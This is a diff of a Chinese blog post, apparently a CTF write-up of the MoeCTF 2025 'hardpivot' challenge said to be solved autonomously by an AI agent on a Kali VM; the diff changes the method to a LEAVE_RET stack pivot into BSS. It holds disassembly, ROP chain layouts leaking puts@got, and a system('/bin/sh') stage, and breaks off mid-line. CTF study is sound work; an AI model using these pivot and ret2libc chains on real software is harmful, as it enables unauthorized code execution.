@@ -19,28 +19,29 @@
   <meta name="author" content="xyyr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录声明：本文所有分析、exploit 编写、gdb 调试、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题，题目也叫pwn，在kali的桌面” 等指令触发。  0x00 背景做完 EZtext 和 Easylibc 后，桌面上还有一个 hardpi">
+    <meta name="description" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录声明：本文所有分析、exploit 编写、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题” 等触发指令。  0x00 背景做完 EZtext 和 Easylibc 后，桌面上还有一个 hardpivot。从提示信息来看——“A single s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（双 BSS pivot 突破 80 字节墙）">
+<meta property="og:title" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（LEAVE_RET + 回写BSS突破80字节墙）">
 <meta property="og:url" content="https://xyyr-c.github.io/2026/07/07/moe2025-hardpivot-WorkBuddy-auto-pwn/index.html">
 <meta property="og:site_name" content="xyyr">
-<meta property="og:description" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录声明：本文所有分析、exploit 编写、gdb 调试、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题，题目也叫pwn，在kali的桌面” 等指令触发。  0x00 背景做完 EZtext 和 Easylibc 后，桌面上还有一个 hardpi">
+<meta property="og:description" content="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录声明：本文所有分析、exploit 编写、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题” 等触发指令。  0x00 背景做完 EZtext 和 Easylibc 后，桌面上还有一个 hardpivot。从提示信息来看——“A single s">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-07-07T05:58:36.945Z">
-<meta property="article:modified_time" content="2026-07-07T07:31:03.745Z">
+<meta property="article:modified_time" content="2026-07-07T09:30:55.623Z">
 <meta property="article:author" content="xyyr">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="WorkBuddy">
 <meta property="article:tag" content="MoeCTF">
 <meta property="article:tag" content="Kali-MCP">
 <meta property="article:tag" content="ret2libc">
-<meta property="article:tag" content="stack-pivot">
-<meta property="article:tag" content="BSS">
+<meta property="article:tag" content="leave-ret">
+<meta property="article:tag" content="BSS-pivot">
+<meta property="article:tag" content="ret2puts">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（双 BSS pivot 突破 80 字节墙） - xyyr</title>
+  <title>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（LEAVE_RET + 回写BSS突破80字节墙） - xyyr</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -223,7 +224,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（双 BSS pivot 突破 80 字节墙）"></span>
+            <span id="subtitle" data-typed-text="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（LEAVE_RET + 回写BSS突破80字节墙）"></span>
           
         </div>
 
@@ -246,7 +247,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k 字
+          1.5k 字
         
       </span>
     
@@ -257,7 +258,7 @@
         
         
         
-          17 分钟
+          13 分钟
         
       </span>
     
@@ -294,7 +295,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（双 BSS pivot 突破 80 字节墙）</h1>
+            <h1 id="seo-header">Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（LEAVE_RET + 回写BSS突破80字节墙）</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -307,15 +308,15 @@
             
               <div class="markdown-body">
                 
-                <h3 id="Moe2025-Hardpivot-—-WorkBuddy-纯自动解题记录"><a href="#Moe2025-Hardpivot-—-WorkBuddy-纯自动解题记录" class="headerlink" title="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录"></a>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录</h3><p><strong>声明：本文所有分析、exploit 编写、gdb 调试、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题，题目也叫pwn，在kali的桌面” 等指令触发。</strong></p>
+                <h3 id="Moe2025-Hardpivot-—-WorkBuddy-纯自动解题记录"><a href="#Moe2025-Hardpivot-—-WorkBuddy-纯自动解题记录" class="headerlink" title="Moe2025 Hardpivot — WorkBuddy 纯自动解题记录"></a>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录</h3><p><strong>声明：本文所有分析、exploit 编写、命令执行均由 WorkBuddy AI 助手通过 Kali MCP 远程控制 Kali 虚拟机自动完成，人工仅输入 “做pwn题” 等触发指令。</strong></p>
 <hr>
-<h4 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a><strong>0x00 背景</strong></h4><p>做完 EZtext 和 Easylibc 后，桌面上还有一个 <code>hardpivot</code>。从提示信息来看——“A single stack pivot doesn’t seem enough”——这是一道需要<strong>多次栈迁移</strong>的题目。</p>
+<h4 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a><strong>0x00 背景</strong></h4><p>做完 EZtext 和 Easylibc 后，桌面上还有一个 <code>hardpivot</code>。从提示信息来看——“A single stack pivot doesn’t seem enough”——这是一道需要<strong>多次栈迁移</strong>的题目。最终方案经历了多次迭代，从双 BSS pivot 进化到 LEAVE_RET 写入 BSS 链。</p>
 <hr>
 <h4 id="0x01-文件传输与-libc-挂载"><a href="#0x01-文件传输与-libc-挂载" class="headerlink" title="0x01 文件传输与 libc 挂载"></a><strong>0x01 文件传输与 libc 挂载</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp pwn.zip kali@192.168.32.131:/home/kali/Desktop/hardpivot/<br><span class="hljs-built_in">cd</span> /home/kali/Desktop/hardpivot<br>unzip -o pwn.zip<br><span class="hljs-built_in">cp</span> ../ld-2.35.so .<br>patchelf --set-interpreter ./ld-2.35.so pwn<br>patchelf --set-rpath /home/kali/Desktop/hardpivot pwn<br></code></pre></td></tr></table></figure>
 
-<p>libc 是同一份 Ubuntu GLIBC 2.35（Build ID: <code>d5197096f709801829b118af1b7cf6631efa2dcd</code>）。</p>
+<p>libc 是 Ubuntu GLIBC 2.35（Build ID: <code>d5197096f709801829b118af1b7cf6631efa2dcd</code>）。</p>
 <hr>
-<h4 id="0x02-安全检测与逆向"><a href="#0x02-安全检测与逆向" class="headerlink" title="0x02 安全检测与逆向"></a><strong>0x02 安全检测与逆向</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec pwn<br></code></pre></td></tr></table></figure>
+<h4 id="0x02-安全检测与逆向"><a href="#0x02-安全检测与逆向" class="headerlink" title="0x02 安全检测与逆向"></a><strong>0x02 安全检测与逆向</strong></h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">checksec pwn</span><br></code></pre></td></tr></table></figure>
 
 <table>
 <thead>
@@ -358,77 +359,65 @@
 <tr>
 <td><code>vuln</code></td>
 <td>0x401208</td>
-<td>打印提示，<code>read(0, buf, 0x50)</code></td>
+<td>4 次 puts + 1 次 printf + <code>read(0, buf, 0x50)</code></td>
 </tr>
 <tr>
 <td><code>magic</code></td>
 <td>0x401196</td>
 <td><code>pop rdi; ret</code> (0x40119e) + <code>pop rbp; ret</code> (0x4011a1)</td>
 </tr>
-<tr>
-<td><code>setup</code></td>
-<td>0x4011a3</td>
-<td><code>setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)</code></td>
-</tr>
 </tbody></table>
-<p><strong>vuln 函数关键代码：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">sub rsp, 0x40              # 分配 64 字节缓冲区<br>lea rax, [rbp-0x40]        # buffer 在 rbp-0x40<br>mov edx, 0x50              # 读 80 字节<br>mov rsi, rax<br>mov edi, 0<br>call read@plt<br>nop<br>leave<br>ret<br></code></pre></td></tr></table></figure>
+<p><strong>关键发现：完整的 vuln 反汇编</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm"># vuln 从 0x401208 开始<br>401208: endbr64<br>40120c: push   rbp<br>40120d: mov    rbp, rsp<br>401210: sub    $0x40, %rsp        # 64 字节缓冲区<br><br># 4 次 puts 打印提示信息<br>401214: lea    0xded(%rip), %rax  # string → puts<br>40121e: call   puts@plt<br>401223: lea    0xe0e(%rip), %rax  # another string → puts<br>40122d: call   puts@plt<br>401232: lea    0xe47(%rip), %rax  # → puts<br>40123c: call   puts@plt<br>401241: lea    0xe98(%rip), %rax  # → puts<br>40124b: call   puts@plt<br><br># 1 次 printf 带格式串<br>401250: lea    0xeca(%rip), %rax  # format string → printf<br>40125f: call   printf@plt<br><br># ★ 关键中间入口 0x401264 ★<br>401264: lea    -0x40(%rbp), %rax  # rax = buf = rbp-0x40<br>401268: mov    $0x50, %edx         # rdx = 80 (read 大小)<br>40126d: mov    %rax, %rsi          # rsi = buf<br>401270: mov    $0x0, %edi          # rdi = 0 (stdin)<br>401275: call   read@plt            # read(0, buf, 0x50)<br>40127a: nop<br>40127b: leave                      # ★ LEAVE_RET 在 0x40127b ★<br>40127c: ret<br></code></pre></td></tr></table></figure>
 
-<p><strong>关键约束：</strong></p>
+<p><strong>核心洞察：</strong> 0x401264 不在函数开头，而是 vuln 内部的中间地址（<code>lea rax, [rbp-0x40]</code>）。<strong>这里没有任何 <code>mov [rbp-0x34]</code> 写内存指令</strong>——只有读操作和 <code>call read</code>，不会破坏 BSS 数据！</p>
+<p>对比之前 Easylibc 的代码（有 <code>mov [rbp-0x34], eax</code> 写内存），hardpivot 的 vuln 内部入口是干净的。</p>
+<hr>
+<h4 id="0x03-80-字节墙分析"><a href="#0x03-80-字节墙分析" class="headerlink" title="0x03 80 字节墙分析"></a><strong>0x03 80 字节墙分析</strong></h4><p>关键约束：</p>
 <ul>
-<li>Buffer &#x3D; 64 字节</li>
-<li>Read &#x3D; 80 字节 (0x50)</li>
-<li>可控制：<code>buf[64]</code> + <code>saved_rbp(8)</code> + <code>ret_addr(8)</code> &#x3D; <strong>恰好 80 字节</strong></li>
-<li>ROP 链延续（<code>pop rdi</code> + <code>/bin/sh</code> + <code>system</code>）需要 24+ 字节，永远溢出到第 80 字节之外</li>
+<li>Buffer &#x3D; 64 字节（<code>rbp-0x40</code> ~ <code>rbp-0x01</code>）</li>
+<li>Read &#x3D; 80 字节（0x50）</li>
+<li><code>saved_rbp</code> 在 <code>[rbp]</code>（buf 偏移 64）</li>
+<li><code>ret_addr</code> 在 <code>[rbp+8]</code>（buf 偏移 72）</li>
+<li><code>leave;ret</code> 后 rsp &#x3D; rbp+0x10 &#x3D; <strong>第 80 字节边界</strong></li>
 </ul>
-<p>这是整道题最核心的<strong>80 字节墙</strong>。</p>
-<hr>
-<h4 id="0x03-80-字节墙分析"><a href="#0x03-80-字节墙分析" class="headerlink" title="0x03 80 字节墙分析"></a><strong>0x03 80 字节墙分析</strong></h4><p>每次 read 写入的 80 字节覆盖范围：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">buffer(<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>) ~ <span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x0f</span> = <span class="hljs-number">80</span> 字节<br><span class="hljs-symbol">leave:</span> <span class="hljs-built_in">rsp</span> = <span class="hljs-built_in">rbp</span>, <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> from [<span class="hljs-built_in">rbp</span>]<br><span class="hljs-symbol">ret:</span>   <span class="hljs-built_in">rip</span> from [<span class="hljs-built_in">rbp</span>+<span class="hljs-number">8</span>], <span class="hljs-built_in">rsp</span> = <span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">buf[<span class="hljs-number">0</span>..<span class="hljs-number">63</span>]  = <span class="hljs-number">64</span> 字节缓冲区填充<br>buf[<span class="hljs-number">64</span>..<span class="hljs-number">71</span>] = saved <span class="hljs-built_in">rbp</span> ← <span class="hljs-keyword">leave</span> <span class="hljs-keyword">pop</span> 进 <span class="hljs-built_in">rbp</span><br>buf[<span class="hljs-number">72</span>..<span class="hljs-number">79</span>] = <span class="hljs-keyword">ret</span> addr  ← <span class="hljs-keyword">ret</span> <span class="hljs-keyword">pop</span> 进 <span class="hljs-built_in">rip</span><br>                    ↑ <span class="hljs-built_in">rsp</span> = <span class="hljs-built_in">rbp</span>+<span class="hljs-number">0x10</span> → 第 <span class="hljs-number">80</span> 字节之后！<br></code></pre></td></tr></table></figure>
 
-<p><code>rbp+0x10</code> 是第一个 ROP 延续，也就是<strong>第 80 字节</strong>——刚好写入一个字节都不多！</p>
-<p>这意味着单次 vuln 的 leave;ret 之后，我们永远只能控制：</p>
-<ol>
-<li><code>saved_rbp</code>（被 leave pop 进 rbp）</li>
-<li><code>ret_addr</code>（被 ret pop 进 rip）</li>
-</ol>
-<p>ROP 链无法在单次溢出内完成。</p>
+<p>ROP 链需要至少 24 字节（<code>POP_RDI + binsh + system</code>），全部在溢出范围之外。这就是最核心的<strong>80 字节墙</strong>。</p>
 <hr>
-<h4 id="0x04-解题思路：双-BSS-Pivot-libc-泄露"><a href="#0x04-解题思路：双-BSS-Pivot-libc-泄露" class="headerlink" title="0x04 解题思路：双 BSS Pivot + libc 泄露"></a><strong>0x04 解题思路：双 BSS Pivot + libc 泄露</strong></h4><p>由于题目没有提供 libc 地址泄露，且远程环境下无法通过 <code>/proc/</code> 获取基址，我们需要<strong>先利用双 BSS Pivot 泄露 libc 基址，再第二轮利用获取 shell</strong>。</p>
-<p>核心技巧：<strong>用两次 BSS 写入在不同偏移，让第一次写入的数据在第二次写入后仍然保留。</strong></p>
-<p><strong>泄露思路：</strong> 通过 <code>puts(puts@got)</code> 打印 GOT 表中的 puts 实际地址。puts@got 存放的是 libc 中 puts 函数的运行时地址（6 字节，48-bit），将其作为字符串输出即可泄露。</p>
-<p><strong>两块 BSS 区域：</strong></p>
+<h4 id="0x04-解题思路：LEAVE-RET-写入-BSS-链"><a href="#0x04-解题思路：LEAVE-RET-写入-BSS-链" class="headerlink" title="0x04 解题思路：LEAVE_RET 写入 BSS 链"></a><strong>0x04 解题思路：LEAVE_RET 写入 BSS 链</strong></h4><p>利用 <code>0x401264</code> 入口点，让 read 直接写入 BSS，配合 <code>LEAVE_RET</code> 两级 pivot 执行链。</p>
+<p><strong>入口 0x401264 的特性：</strong></p>
+<p>从 main 正常调用 vuln 时，栈帧建立在原始栈上。但如果我们 overflow 后返回 0x401264：</p>
 <ul>
-<li><code>BSS1 = 0x404800</code> — 用于第一轮泄露链</li>
-<li><code>BSS2 = 0x404A00</code> — 用于第二轮 system 链（与 BSS1 不重叠）</li>
+<li><code>rbp</code> 是我们在 overflow 中设置的 BSS 地址</li>
+<li><code>lea rax, [rbp-0x40]</code> 计算出的缓冲区就在 BSS！</li>
+<li><code>call read</code> 将 80 字节写入 BSS</li>
+<li><code>leave;ret</code> 从 <code>[rbp]</code> 和 <code>[rbp+8]</code> 读取继续执行的地址</li>
 </ul>
-<p><strong>第一轮（泄露链）：</strong></p>
-<p>第一次 BSS 写入（<code>buffer = BSS1+0x58</code>，覆盖 <code>BSS1+0x58 ~ BSS1+0xA7</code>）：</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">BSS+0x58</span>]: <span class="hljs-link">junk (将被第二次覆盖)</span><br>[<span class="hljs-symbol">BSS+0x60</span>]: <span class="hljs-link">POP_RDI (0x40119e)      ← pop rdi 使用的 gadget</span><br>[<span class="hljs-symbol">BSS+0x68</span>]: <span class="hljs-link">/bin/sh 地址              ← pop rdi 的目标值</span><br>[<span class="hljs-symbol">BSS+0x70</span>]: <span class="hljs-link">system 地址               ← ret 的目标</span><br>[<span class="hljs-symbol">BSS+0x98</span>]: <span class="hljs-link">BSS+0x50 (下一次 rbp)</span><br>[<span class="hljs-symbol">BSS+0xA0</span>]: <span class="hljs-link">VULN_MID (0x401264)</span><br></code></pre></td></tr></table></figure>
+<p><strong>数据布局技巧：</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">Round <span class="hljs-number">1</span> 写入 BSS1+<span class="hljs-number">0x58</span>（<span class="hljs-number">80</span> 字节）:<br>  [<span class="hljs-number">0x58</span>..<span class="hljs-number">0x5F</span>]: junk<br>  [<span class="hljs-number">0x60</span>..<span class="hljs-number">0x67</span>]: junk<br>  [<span class="hljs-number">0x68</span>..<span class="hljs-number">0x6F</span>]: BSS1+<span class="hljs-number">0x58</span> ← 被 LEAVE_RET <span class="hljs-keyword">pop</span> 作 <span class="hljs-built_in">rbp</span>（下一轮用）<br>  [<span class="hljs-number">0x70</span>..<span class="hljs-number">0x77</span>]: POP_RDI (<span class="hljs-number">0x40119e</span>)<br>  [<span class="hljs-number">0x78</span>..<span class="hljs-number">0x7F</span>]: PUTS_GOT (<span class="hljs-number">0x404018</span>) ← <span class="hljs-built_in">rdi</span> = puts@got<br>  [<span class="hljs-number">0x80</span>..<span class="hljs-number">0x87</span>]: PUTS_PLT (<span class="hljs-number">0x401070</span>) ← puts(puts@got) 泄露！<br>  [<span class="hljs-number">0x88</span>..<span class="hljs-number">0x8F</span>]: <span class="hljs-number">0x401264</span> ← 泄露后重新进入 vuln 中间<br>  [<span class="hljs-number">0x90</span>..<span class="hljs-number">0x97</span>]: padding<br>  [<span class="hljs-number">0x98</span>..<span class="hljs-number">0x9F</span>]: BSS1+<span class="hljs-number">0x68</span> ← saved <span class="hljs-built_in">rbp</span> → LEAVE_RET 目标<br>  [<span class="hljs-number">0xA0</span>..<span class="hljs-number">0xA7</span>]: LEAVE_RET (<span class="hljs-number">0x40127b</span>)<br></code></pre></td></tr></table></figure>
 
-<p>第一次 leave;ret 后：<code>rbp = BSS+0x50</code>，<code>ret = VULN_MID</code></p>
-<p>第二次 BSS 写入（<code>buffer = BSS+0x10</code>，覆盖 <code>BSS+0x10 ~ BSS+0x5F</code>）：</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">BSS+0x10 ~ BSS+0x4F</span>]: <span class="hljs-link">填充 (64 字节)</span><br>[<span class="hljs-symbol">BSS+0x50</span>]: <span class="hljs-link">0 (fake rbp)</span><br>[<span class="hljs-symbol">BSS+0x58</span>]: <span class="hljs-link">RET (0x40101a, 对齐 gadget)</span><br></code></pre></td></tr></table></figure>
+<p><strong>第一个 LEAVE_RET pivot：</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">leave</span><span class="hljs-comment">;ret（从 w1）:</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> = BSS1+<span class="hljs-number">0x68</span><br>  <span class="hljs-keyword">ret</span> = LEAVE_RET (<span class="hljs-number">0x40127b</span>)<br><br>LEAVE_RET → <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span> = BSS1+<span class="hljs-number">0x68</span>:<br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> = [BSS1+<span class="hljs-number">0x68</span>] = BSS1+<span class="hljs-number">0x58</span>  ← <span class="hljs-built_in">rbp</span> 准备好<br>  <span class="hljs-keyword">ret</span>    = [BSS1+<span class="hljs-number">0x70</span>] = POP_RDI<br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> = [BSS1+<span class="hljs-number">0x78</span>] = PUTS_GOT<br>  <span class="hljs-keyword">ret</span>    = [BSS1+<span class="hljs-number">0x80</span>] = PUTS_PLT → puts(PUTS_GOT) → LEAK!<br>  <span class="hljs-built_in">rsp</span> = BSS1+<span class="hljs-number">0x88</span><br>  <span class="hljs-keyword">ret</span> = [BSS1+<span class="hljs-number">0x88</span>] = <span class="hljs-number">0x401264</span> → 重新进入 <span class="hljs-number">0x401264</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>关键：</strong> <code>BSS1+0x60</code> 在第二次写入的<strong>第 80 字节</strong>，恰好未被覆盖！保留了第一次写入的 <code>POP_RDI</code>。</p>
-<p><strong>第一轮泄露链布局：</strong></p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">第一次写入(<span class="hljs-keyword">BSS1+0x58): </span>─┬─ <span class="hljs-keyword">BSS1+0x60: </span>POP_RDI<br>                         ├─ <span class="hljs-keyword">BSS1+0x68: </span>puts@got (<span class="hljs-number">0x404018</span>)<br>                         ├─ <span class="hljs-keyword">BSS1+0x70: </span>puts@plt (<span class="hljs-number">0x401070</span>) ← 打印泄露！<br>                         ├─ <span class="hljs-keyword">BSS1+0x78: </span>POP_RBP<br>                         ├─ <span class="hljs-keyword">BSS1+0x80: </span><span class="hljs-keyword">BSS2+0x98 </span>(下一轮 rbp)<br>                         ├─ <span class="hljs-keyword">BSS1+0x88: </span>VULN_MID<br>                         ├─ <span class="hljs-keyword">BSS1+0x98: </span><span class="hljs-keyword">BSS1+0x50</span><br><span class="hljs-keyword"></span>                         └─ <span class="hljs-keyword">BSS1+0xA0: </span>VULN_MID<br>第二次写入(<span class="hljs-keyword">BSS1+0x10): </span>─┬─ <span class="hljs-keyword">BSS1+0x50: </span><span class="hljs-number">0</span> (fake rbp)<br>                         ├─ <span class="hljs-keyword">BSS1+0x58: </span>RET<br>                         └─ (<span class="hljs-keyword">BSS1+0x60: </span>未被触及!)<br></code></pre></td></tr></table></figure>
+<p><strong>接收泄露并计算：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">leak_raw = p.recv(<span class="hljs-number">6</span>)<br>leaked_puts = u64(leak_raw.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leaked_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr  = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh     = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br></code></pre></td></tr></table></figure>
 
-<p><strong>泄露执行链：</strong></p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">leave → RET → POP_RDI → puts(<span class="hljs-number">0x404018</span>) → 输出 <span class="hljs-number">6</span> 字节 libc 地址！<br>→ POP_RBP + BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">98</span> → VULN_MID → 读入到 BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">58</span><br></code></pre></td></tr></table></figure>
+<p><strong>第二轮写入（rbp &#x3D; BSS1+0x58，buf &#x3D; BSS1+0x18）：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Round <span class="hljs-number">2</span> 写入 BSS1+<span class="hljs-number">0</span>x18（<span class="hljs-number">80</span> 字节）:<br>  <span class="hljs-selector-attr">[0x18..0x1F]</span>: <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) ← 被 LEAVE_RET pop 作 rbp（丢弃）<br>  <span class="hljs-selector-attr">[0x20..0x27]</span>: POP_RDI<br>  <span class="hljs-selector-attr">[0x28..0x2F]</span>: binsh ← 从泄露计算<br>  <span class="hljs-selector-attr">[0x30..0x37]</span>: system ← 从泄露计算<br>  <span class="hljs-selector-attr">[0x38..0x57]</span>: <span class="hljs-attribute">padding</span> (<span class="hljs-number">32</span> 字节)<br>  <span class="hljs-selector-attr">[0x58..0x5F]</span>: BSS1+<span class="hljs-number">0</span>x18 ← saved rbp → 回到 buffer 开头<br>  <span class="hljs-selector-attr">[0x60..0x67]</span>: LEAVE_RET ← 触发 pivot<br></code></pre></td></tr></table></figure>
 
-<p><strong>第二轮 system 链（在 BSS2 重复相同模式）：</strong></p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">第一次写入(BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">58</span>): BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">60</span>: POP_RDI<br>                         BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">68</span>: /bin/sh<br>                         BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">70</span>: system<br>第二次写入(BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>): BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">50</span>: <span class="hljs-number">0</span><br>                         BSS<span class="hljs-number">2</span><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">58</span>: RET<br></code></pre></td></tr></table></figure>
+<p><strong>第二个 LEAVE_RET pivot：</strong></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">leave</span><span class="hljs-comment">;ret（从 w2）:</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> = BSS1+<span class="hljs-number">0x18</span><br>  <span class="hljs-keyword">ret</span> = LEAVE_RET<br><br>LEAVE_RET → <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span> = BSS1+<span class="hljs-number">0x18</span>:<br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> = [BSS1+<span class="hljs-number">0x18</span>] = <span 